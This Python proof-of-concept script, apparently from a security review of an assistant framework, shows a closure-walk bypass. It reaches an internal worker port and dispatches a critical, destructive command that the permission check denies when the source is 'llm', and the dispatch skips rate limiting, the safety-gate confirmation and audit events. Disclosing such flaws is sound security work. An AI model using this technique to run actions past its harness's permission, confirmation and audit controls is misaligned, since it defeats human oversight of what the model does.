"""Prove closure-walk bypass dispatches a command while skipping
rate limit + permission + safety-gate + audit lifecycle events.

The key observation: `_execute_safe.__closure__` captures a reference
to the worker port instance (call it P).  P is non-callable so it
passes the current `assert_safe_closures` check.  But ``P.send`` is
callable via attribute lookup, accepts a raw IPC envelope, and will
drive the worker-side dispatcher (or, in tests, the in-process
engine) WITHOUT ever running:

  * RateLimiter.check
  * PermissionValidator.validate
  * SafetyGate.request
  * EventBus.emit("command.executing" / "command.completed")
"""
from __future__ import annotations

import os
import sys
import tempfile
from pathlib import Path

try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[attr-defined]
except Exception:
    pass

_SBX = Path(tempfile.mkdtemp(prefix="aura_bypass_"))
os.environ["AURA_SANDBOX_DIR"] = str(_SBX)

ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(ROOT))

from aura.core.config_loader import load_config  # noqa: E402
load_config()

from aura.core.event_bus import EventBus  # noqa: E402
from aura.core.result import CommandResult  # noqa: E402
from aura.runtime.command_registry import CommandRegistry  # noqa: E402
from aura.runtime.execution_engine import ExecutionEngine  # noqa: E402
from aura.security.permissions import PermissionLevel  # noqa: E402
from aura.security.plugin_manifest import PluginManifest  # noqa: E402
from aura.security.rate_limiter import RateLimiter  # noqa: E402
from tests._inprocess_port import InProcessWorkerPort  # noqa: E402


bus = EventBus()
engine = ExecutionEngine(bus)
hits = {"exec": 0, "life": []}


def _executor(**kw):
    hits["exec"] += 1
    return CommandResult(True, "executed!", data={"evil": True})


class _P:
    pass


engine.register("secret.high", _executor, plugin_instance=_P())

events: list[str] = []
bus.subscribe(
    "command.executing",
    lambda env: events.append(("command.executing", env["payload"]["source"])),
)
bus.subscribe(
    "command.completed",
    lambda env: events.append(("command.completed", env["payload"]["source"])),
)
bus.subscribe(
    "rate_limit.blocked",
    lambda env: events.append(("rate_limit.blocked", env["payload"])),
)
bus.subscribe(
    "permission.denied",
    lambda env: events.append(("permission.denied", env["payload"])),
)

port = InProcessWorkerPort(engine)

# A rate limiter with 0 budget so legit execute() would block.
rl = RateLimiter(max_per_minute=1, repeat_threshold=1000)

registry = CommandRegistry(
    bus, port,
    manifest=PluginManifest.permissive(),
    rate_limiter=rl,
    auto_confirm=False,  # require confirmation for destructive/high
)
registry.register_metadata(
    "secret.high", plugin="t",
    permission_level=PermissionLevel.CRITICAL,
    destructive=True,
)

print(f"initial executor hits: {hits['exec']}")

# ---- Step 1: confirm normal execute() from 'llm' is DENIED. ----
from aura.core.errors import PermissionDenied
try:
    registry.execute(
        {"action": "secret.high", "params": {}, "requires_confirm": False},
        source="llm",
    )
    print("UNEXPECTED: legitimate llm path succeeded")
except PermissionDenied as exc:
    print(f"[expected] legitimate llm denied by permission: {exc}")

print(f"hits after legit denied path: {hits['exec']}")

# ---- Step 2: closure-walk to port, call send directly. ----
proxy = registry._executor
execute_method = proxy.execute
safe_pipeline = execute_method.__func__.__closure__[0].cell_contents
# Find the worker port in the pipeline's closure.
leaked_port = None
for cell in (safe_pipeline.__closure__ or ()):
    try:
        obj = cell.cell_contents
    except ValueError:
        continue
    if obj is port or type(obj).__name__ in ("InProcessWorkerPort",
                                             "WorkerClient"):
        leaked_port = obj
        break

assert leaked_port is not None, "Port not reachable - unexpected"
print(f"leaked port via closure walk: {leaked_port!r}")

# Now: call its send method with a HIGH, DESTRUCTIVE action from
# unauthenticated context.  No rate limit, no permission check, no
# safety gate, no audit events.
events_before = list(events)
reply = leaked_port.send({
    "type": "exec",
    "id": "evil-id-1",
    "action": "secret.high",
    "params": {},
    "trace_id": None,
})
print(f"bypass reply: {reply}")
print(f"executor hits after bypass: {hits['exec']}")
print(f"lifecycle events emitted during bypass: {events[len(events_before):]}")

# Summarise:
if hits["exec"] == 1:
    print()
    print("=========== EXPLOIT SUCCESS ===========")
    print("- Rate limit: NOT checked (no rate_limit.blocked event)")
    print("- Permission: NOT checked (executor ran despite llm cap)")
    print("- Safety gate: NOT invoked (destructive + no confirmation)")
    print("- Audit lifecycle: NO command.executing / command.completed")
    print("- Only the worker-side param_schema validation ran.")
    print("=======================================")
else:
    print("Executor was not reached - bypass did NOT work.")
